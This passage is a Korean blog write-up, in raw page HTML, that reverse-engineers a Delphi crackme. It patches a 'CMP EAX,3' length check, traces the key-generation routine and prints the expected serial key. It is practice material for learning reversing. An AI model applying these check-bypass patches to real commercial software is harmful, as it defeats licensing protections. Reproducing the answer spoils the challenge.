url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB9UlEQVR42lXO226bQBAGYB6zdTBJWqmqosq96gP0taIaYyKT2k4MazAkwB5h2cWAl7WT+8qkVdvvYvTPSDMa49O375PJZHLz+evky9WlOb4YWebIGg/VHI0v3r8Fyxx9uLIsc3Rtjc3Ru4/Xl1eWabh3C9/3nZkzdxzbtu3p1J3PZzPHnc/t6dRbeK7rOvbMde+m0x9zx5nZM89bbDab29tboyy51loIUVWVEKI8KyhlnFeMFUIIXlWccylkWZacc0qplLLe78Pt1sjzPM/ysuSM0ufnlBWFUup0/KsoOUKw5LzinDJ2Or0opZqmTZLYiONkC7ZplsMcPqwf0ixT/yOERlGUZTlGaLeLGWN1XUspA9830jTL0gwTgiCKwggT2nWdUqr/g7EyeUowxhihIAiiKOKc13UNABiWs5wQwlhRy/r19aX/h9YaYxzHCcaIEJqmzxiTXh+bZh+FoSGl6Pu+67rD4aCUatv2LSilDgOt9fF41Fr3fX86nbTWb0OEoAGCAIBt4AdhGJ7/x7gbtG3bteeLzaAdhucw6PseQmhkafr4uNmGIaUM5jAIAt8PCGW1lOvVerdLhBBN0wAAkuSpqqq27eLdjhCaJImxWi49z/t5f79arSmjCCEIIaWUMYaGpiiK3xmhoigwxsvlEgDgLRa/APh+IcJkpFypAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1e819e42faf6c5f244cb7d7feb49ed54/c9b55/1.webp 165w,\n/static/1e819e42faf6c5f244cb7d7feb49ed54/f2908/1.webp 330w,\n/static/1e819e42faf6c5f244cb7d7feb49ed54/cd572/1.webp 418w\"\n              sizes=\"(max-width: 418px) 100vw, 418px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1e819e42faf6c5f244cb7d7feb49ed54/04c57/1.png 165w,\n/static/1e819e42faf6c5f244cb7d7feb49ed54/d9ecf/1.png 330w,\n/static/1e819e42faf6c5f244cb7d7feb49ed54/d7398/1.png 418w\"\n            sizes=\"(max-width: 418px) 100vw, 418px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1e819e42faf6c5f244cb7d7feb49ed54/d7398/1.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>델파이로 작성되었으며, 패킹은 되어있지 않다. 그대로 분석을 진행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 363px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.515151515151516%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABi0lEQVR42nWRW2/TMBSA89Noetle4HH/bv9g7UiRGFJatX0pTKqgWwehaxzHlzhJfRUomTKoiuJsUx7Gp0/WObKPfI7t9Nw3fbfT9qTfPR30avvdE+vpoDfous3uwO103M5Z1z1/99aZz2YT32879saj0XA4vPC892PP+zD2LkeXVx+vppNJc8D3/cV0ul4snOrxsaqqv5aDJUuzCIAogoylCU0YYwBAY8zxeDw88+dwKKvKkVJqixBib5FSKqW01jZ4ioUQvIUUQknpGGN2IfgRBITQoizKsmwvv/+DEEIp5WhtQgARQnGMEEKUEEopJiRJEpokSmvzGpzzplgTQvI8J4Teb7cgrKeFEQRhGAJgzK+Hh7J4prQURaEs9c0B5t92dBWg6+9w9RPdALbasZzzPMsghBhjxliWZWma2u7qdL/fa60drszyDq6D3fzLV+/TbH69XgdgstrGmMYwWi4/39xuCMEY1+NsNptbmzLG6mKjdcp1xFSc6cYoVTjXSqnm2WWLptuX7/gHzqfwfYZ56jUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6694c34459d77768b0bdd7413e1a0cfd/c9b55/2.webp 165w,\n/static/6694c34459d77768b0bdd7413e1a0cfd/f2908/2.webp 330w,\n/static/6694c34459d77768b0bdd7413e1a0cfd/2ed29/2.webp 363w\"\n              sizes=\"(max-width: 363px) 100vw, 363px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6694c34459d77768b0bdd7413e1a0cfd/04c57/2.png 165w,\n/static/6694c34459d77768b0bdd7413e1a0cfd/d9ecf/2.png 330w,\n/static/6694c34459d77768b0bdd7413e1a0cfd/4e786/2.png 363w\"\n            sizes=\"(max-width: 363px) 100vw, 363px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6694c34459d77768b0bdd7413e1a0cfd/4e786/2.png\"\n            alt=\"crackme inpug\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>A와 12345를 입력하였더니 ‘Please Enter More Chars…’라는 문자열이 떴다. 이를 바탕으로 스트링을 검색하여 해당 주소지들을 찾았다. Name이 30자 이하가 되어야 한다는 것도 추가적으로 알 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.93939393939394%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABGklEQVR42l2Q2W7CMBREr20SEyOCQklwHBPbcQxZALX9tS4PfalElRYh9Z+rkC7Qo3mauVcjDbjyrW5Obn3c7z9ldgB4AHhC6BngcRG/2vJo7UdVnbR+N0VnTJeKLgwPs1nneS+wXmd1q63lu52RMiIjwBgG5jczpeI8XygdzyOGoI8I6TUaAUIASumqbjIhq6rJ5CpJUt8PADAAoZQhRM7CCJGzeSkC2qimqYVIi8KkQnDOgyAYmimlcA1Cfd8f1hbbbauNKmyxTBI2Yb8RpRRj/O/+irK0211bOnt3f+ucJQQPDQAQRVEmxZIvV3k+nU7H43EYhowxz/O+n7XKNxvHU146l0lxmTHG/B7KGKOU+r4/mfQO/pn0C+S1H1vD3REuAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/74008579c0a2881d9cd3fcf6786f939d/c9b55/3.webp 165w,\n/static/74008579c0a2881d9cd3fcf6786f939d/f2908/3.webp 330w,\n/static/74008579c0a2881d9cd3fcf6786f939d/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/74008579c0a2881d9cd3fcf6786f939d/04c57/3.png 165w,\n/static/74008579c0a2881d9cd3fcf6786f939d/d9ecf/3.png 330w,\n/static/74008579c0a2881d9cd3fcf6786f939d/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/74008579c0a2881d9cd3fcf6786f939d/32056/3.png\"\n            alt=\"string ascii\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>다음은 정답 판별 부분이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA1ElEQVR42k2Ny0rEMBRA74194YiI0LTpM40p6QztiI9V08YMdMDtRJf9Ab/Bn5cyGw8cOLsDF3dZ1/XbOfflltNZf5r0p79rfUgASuhf+klP4zhqradpWpbFGGPth7V2nmfIc6aUqjlvRPn6JlVbHUrVdW14DP3KRwDcBNiCFEUe05jGccZYFIUgBB+GvhFP3V48H7N2X5fmJAclDpyxlFIqGr7b3SKi53lRFCEiIeSGbADL0lbKhvOqKh7uHxlP3n/PIH2sARMEH8j1C0AICYIA/vEHWHgbevQ+wn0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/321ff7a620e264b053532294eada3fa7/c9b55/4.webp 165w,\n/static/321ff7a620e264b053532294eada3fa7/f2908/4.webp 330w,\n/static/321ff7a620e264b053532294eada3fa7/ff4b8/4.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/321ff7a620e264b053532294eada3fa7/04c57/4.png 165w,\n/static/321ff7a620e264b053532294eada3fa7/d9ecf/4.png 330w,\n/static/321ff7a620e264b053532294eada3fa7/32056/4.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/321ff7a620e264b053532294eada3fa7/32056/4.png\"\n            alt=\"into good boy\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>그리고 그 위에는 다음과 같은 부분들이 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.21212121212121%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAy0lEQVR42mXMwW6CQBgE4J+wbjWGn92Aii5bSAoLelCRjbCglx6ktUnpoS/g+79EQw968Mskc5qBrrv0/XfXXb6uH+17vf7J/ITDElb5qj7WpdZFURhj2lNrjGmaxvyrqqosS1C5Kva7NE203lbnw+Z25dqfqPEUp5wxx3EIIYiI7hA+YK7LEJFSCqEM8yyTQkRRLOS8+d37+Ywv2Hj0YhPbJgQARpRalgXPXiOpVBoEQZq8iThefPZiLWehzzn3PM9FBAB6Hw/1+PkDZngZvFtAHasAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/246a61d51de620b7bdc173d28b312e6c/c9b55/5.webp 165w,\n/static/246a61d51de620b7bdc173d28b312e6c/f2908/5.webp 330w,\n/static/246a61d51de620b7bdc173d28b312e6c/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/246a61d51de620b7bdc173d28b312e6c/04c57/5.png 165w,\n/static/246a61d51de620b7bdc173d28b312e6c/d9ecf/5.png 330w,\n/static/246a61d51de620b7bdc173d28b312e6c/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/246a61d51de620b7bdc173d28b312e6c/32056/5.png\"\n            alt=\"up1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.78787878787879%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAtElEQVR42nXB0W6CMBQA0DvpjIKgxmhQSiO9vdy2YDSyxamJJLDHPe3/P8bE+KjnQNd1bds2+8ZdbNVzivNIRb72dVVprZnZe8/Mzjlnn5jZWktE8HM6Nc2xv52//q7q95BgOFJjmUtE3GzWWZYxl2iwLEsiMmiICLUmIpnnYAwi6nSV1leq/ncxJck2FkPxKQQABA/wTlFsMym1Uur7uO7Pi2I6Xc6iMJzEk0EwEA8A8PHKHWzWGKxG/xcMAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/16bb8cad6b3d11bade0b6adc2defd305/c9b55/6.webp 165w,\n/static/16bb8cad6b3d11bade0b6adc2defd305/f2908/6.webp 330w,\n/static/16bb8cad6b3d11bade0b6adc2defd305/ff4b8/6.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/16bb8cad6b3d11bade0b6adc2defd305/04c57/6.png 165w,\n/static/16bb8cad6b3d11bade0b6adc2defd305/d9ecf/6.png 330w,\n/static/16bb8cad6b3d11bade0b6adc2defd305/32056/6.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/16bb8cad6b3d11bade0b6adc2defd305/32056/6.png\"\n            alt=\"up2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>“Please Enter More Chars…” 파트를 넘기 위해서는 EAX가 3이어야 한다. 프로그램을 실행시켜 보며 분석한 결과 Name이 3글자 이상이어야 EAX가 3이 되는 것을 확인할 수 있었다. 문제에서 Name은 한글자라고도 하였으니 이 조건을 모두 만족시켜줄 Name의 조건을 찾아보려 하였으나 별다른 해결책을 찾지 못하였다. 간단하게 “CMP EAX,3” 부분을 “CMP EAX,1”로 코드패치 하여 덤프를 뜬 이후 진행하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.636363636363637%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABCElEQVR42l3Oy07CQBiG4X9GSafa0M5Qeu70QKFH2AA9UQ8YEjVlo4nGlYl7L8B4M96qKe58Ft/iW73wvd0Ujq3qehgElCrTt3ejWdHwcszGIhHFC1EUCToRBAH++SnyQ5Z5UZTEcTgLlY8ntU1GU3SmnMtU1nVD0zTG2ERVo8D3KZ1TOixjDmPw+fryfOz7Y/9w/9hdd9bXQW41mABY4Md+ta3Wm3U5qO72+5u2vd3trtq2q+u6LCFeLTnnruvUTbrMvdSdFYsFSchoPsIYD7kY/TVatq0bmmGapmVJkjRceZZy1/V8N0s1zpWoqaMiC3zPdmzDNDyPK8oYADDGhBAEgDDCJwihX1/SIduP4V5KAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ab2d2f0cb76e56af6e0e7b9f03ad57e8/c9b55/7.webp 165w,\n/static/ab2d2f0cb76e56af6e0e7b9f03ad57e8/f2908/7.webp 330w,\n/static/ab2d2f0cb76e56af6e0e7b9f03ad57e8/ff4b8/7.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ab2d2f0cb76e56af6e0e7b9f03ad57e8/04c57/7.png 165w,\n/static/ab2d2f0cb76e56af6e0e7b9f03ad57e8/d9ecf/7.png 330w,\n/static/ab2d2f0cb76e56af6e0e7b9f03ad57e8/32056/7.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ab2d2f0cb76e56af6e0e7b9f03ad57e8/32056/7.png\"\n            alt=\"change eax\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>EAX와 EDX 값을 비교하여 정답 여부를 확인하는 것을 볼 수 있다. 저 지점까지 도달하면 EDX에는 아래와 같이 정답 키 값이 들어가 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 355px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 34.54545454545455%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABAElEQVR42o2Qz06EMBjES9l+XwsLpYXSP7BAgd01G30Q7z6IL2CiiRff2shGD2qMv9PMYTKTIXGJNc9Wyi4pDJQ1tvWuRQSldBc8AiN/ME1jrYsxyGXUts6RcyE4pXRfFJkQjDFERI5fcEQAEEIAAFmXg9L3w/wSj8/GPTbNZFsFgC6EptZVVUkpa62dtcYYpZT3TsrSe5fnOZnXvs4f5uJtzV4dPhEit0EJ+Q/nm3NTiKNkdyY/FOx77NMlG1dBks2ShCxLrJQa5/V0ubW+y7JMaeWc88Eb01RVaa0dhkHK8pfmrg9lue+DX2J0bUspRc458uslbLcD+PgsTdOf4XeT/BVmJlmTbAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d72534d5d84c7d240a452518c56ac822/c9b55/8.webp 165w,\n/static/d72534d5d84c7d240a452518c56ac822/f2908/8.webp 330w,\n/static/d72534d5d84c7d240a452518c56ac822/918eb/8.webp 355w\"\n              sizes=\"(max-width: 355px) 100vw, 355px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d72534d5d84c7d240a452518c56ac822/04c57/8.png 165w,\n/static/d72534d5d84c7d240a452518c56ac822/d9ecf/8.png 330w,\n/static/d72534d5d84c7d240a452518c56ac822/526ee/8.png 355w\"\n            sizes=\"(max-width: 355px) 100vw, 355px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d72534d5d84c7d240a452518c56ac822/526ee/8.png\"\n            alt=\"reg\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이제부터 Name에 무엇을 넣어야 키 값이 BEDA-2F56-BC4F4368-8A71-870B이 되는지를 추적해 보도록 하겠다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.515151515151516%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAcklEQVR42l3BTQ6CMBAG0HbRRfWb0qrgWiRqIJmx0S74scI5jFfyAJ7Wve+p7776MOecl/nZP6bm/apvp6IiAgEIwXddm+6pj3ESHphHkSgiV2FmNV/OqTmU5Q6A34RVe8TWwQNYu8IRkbXWGKOV1urfD5F9DfcRv20hAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6fbea18427bb42b58faec173f2541992/c9b55/9.webp 165w,\n/static/6fbea18427bb42b58faec173f2541992/f2908/9.webp 330w,\n/static/6fbea18427bb42b58faec173f2541992/ff4b8/9.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6fbea18427bb42b58faec173f2541992/04c57/9.png 165w,\n/static/6fbea18427bb42b58faec173f2541992/d9ecf/9.png 330w,\n/static/6fbea18427bb42b58faec173f2541992/32056/9.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6fbea18427bb42b58faec173f2541992/32056/9.png\"\n            alt=\"name\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>재실행시켜 해당 지점까지 실행시켰을 때 이미 Name을 통해 만들어낸 키값은 LOCAL.5에 생성되어 있으며 이를 EDX로 MOV하고 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAp0lEQVR42k3JuwrCMBQA0Nsigo9IpBTFtEmT2Naq4FBoe28E6+gDdRGcFH/B/x+cBM964Hk4HG+X6/nUtPvi/ZquhdrIdt8iNohYV1VZluQcEjVISFQjknNE6JyD3XqVrZap0SLNZveHyCIWDsVMxDKWSk2mE865MSY3Ok+SXOtUycXcJjqx1kIRRzwIghFnOvQ+W890QACM4R9jrOf7A4AeQB+g+4svpiMYNkgKGmgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a3b8ac5c73e4be103bc75a69eb23cebc/c9b55/10.webp 165w,\n/static/a3b8ac5c73e4be103bc75a69eb23cebc/f2908/10.webp 330w,\n/static/a3b8ac5c73e4be103bc75a69eb23cebc/ff4b8/10.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a3b8ac5c73e4be103bc75a69eb23cebc/04c57/10.png 165w,\n/static/a3b8ac5c73e4be103bc75a69eb23cebc/d9ecf/10.png 330w,\n/static/a3b8ac5c73e4be103bc75a69eb23cebc/32056/10.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a3b8ac5c73e4be103bc75a69eb23cebc/32056/10.png\"\n            alt=\"mov edx\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>몇 줄 위에서 LEA에서 LOCAL.5의 주소지를 EDX로 받아오고 있고, 45B850 함수를 통과한 이후 제대로 된 키값을 받아오는 것을 볼 수 있었다. 함수 45B850의 내부로 들어가서 관찰하도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABBUlEQVR42i3Oy26CQACF4TNycQaBKdqBAXQMFyMuqgaxWBvbphujpsZqn6Py/qtG02/7L85BGIV5lgrfjyKpa5rj8rwYDweKc05pG3eEEABSSstipmnajm1Z1q3O5rOX1SpJ0+n0SXieKsvx5VSUowfJCSGaphHSMk2DUqqU4q7LKGWMMXqD6/W3aZrdfn8+n34u35/Hr/Kwm8xTp2vbnY5zH+n342pRbbfbzcd7vV6/vm2qul5US6ihKibjQMo0TYpRpp6XwfHgKQsM5Pb3H4BAiK5h9AAH6AEUQBRHeZ4JP0iSxHNdFsd8VQ+yfjgMfV+EUSTEo67rABil7VaLAgbQBjTgD99EHiWq/UvMAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5e98a0e1f82cf362a6b29b09450136e8/c9b55/11.webp 165w,\n/static/5e98a0e1f82cf362a6b29b09450136e8/f2908/11.webp 330w,\n/static/5e98a0e1f82cf362a6b29b09450136e8/ff4b8/11.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5e98a0e1f82cf362a6b29b09450136e8/04c57/11.png 165w,\n/static/5e98a0e1f82cf362a6b29b09450136e8/d9ecf/11.png 330w,\n/static/5e98a0e1f82cf362a6b29b09450136e8/32056/11.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5e98a0e1f82cf362a6b29b09450136e8/32056/11.png\"\n            alt=\"make key\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>해당 함수 내부에서 한줄씩 실행시키다 보면 어떤 유사한 부분이 반복되며 키를 한 파트씩 생성해 내는 것을 볼 수 있었다. 모두 동일하게 4086C8 함수를 통과하면 특정 문자열을 로컬 변수에 저장하는 것을 볼 수 있었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 363px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.45454545454545%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABXElEQVR42m2Py5KbMBBFoQqDxMPiJQmQWmq9jMczX5hvcmp2k5pVfi0F2Tk51cvuPvdmpdX08UHfvX/82NPv94/vx9v3/f6F+AvM08CTsZ8AT6WeefaZvcwiZmeNA0gxgNm8N96bdRGcD+M0dB2tqpKxpu3qPM9eEWI2J/t+AwDv0Hvctk1IPk7j9dqWl8uVsbquj+2XB8sivHMWcd9vxhjnHaLVSgkppJTTNFBK+54JIZdFElL9z2whpaTU5hz6cJoF74eeElIUBSGkruvLpXiNfZq91vqWojEmBO88ruvKBRdSTONh7rpr27b5Gfsgy7PszC8lR0Sl1L4nA3BLMabgg9N6G/q+65qKkOEo32X/8vdYax1jBNCgtUUbQhjHyaJDNNM8z1ys6zJO0zD0gnPGGBecEnJ0ttZqrVKKACrGsN/vR2w+K602tVrEbV2apqlOKKVlWVJKi6L4A1jRMg65lN4HAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/fccedb546905178d20ba534e8f5e9842/c9b55/12.webp 165w,\n/static/fccedb546905178d20ba534e8f5e9842/f2908/12.webp 330w,\n/static/fccedb546905178d20ba534e8f5e9842/2ed29/12.webp 363w\"\n              sizes=\"(max-width: 363px) 100vw, 363px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/fccedb546905178d20ba534e8f5e9842/04c57/12.png 165w,\n/static/fccedb546905178d20ba534e8f5e9842/d9ecf/12.png 330w,\n/static/fccedb546905178d20ba534e8f5e9842/4e786/12.png 363w\"\n            sizes=\"(max-width: 363px) 100vw, 363px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/fccedb546905178d20ba534e8f5e9842/4e786/12.png\"\n            alt=\"after loop\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>반복되는 구간을 모두 지나오면 스택에 키값의 조각들이 쌓여있는 것을 볼 수 있다. 이 반복되는 부분을 분석해 보도록 하겠다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.36363636363637%; position: relative; bottom: 0; left: 0; background-image: 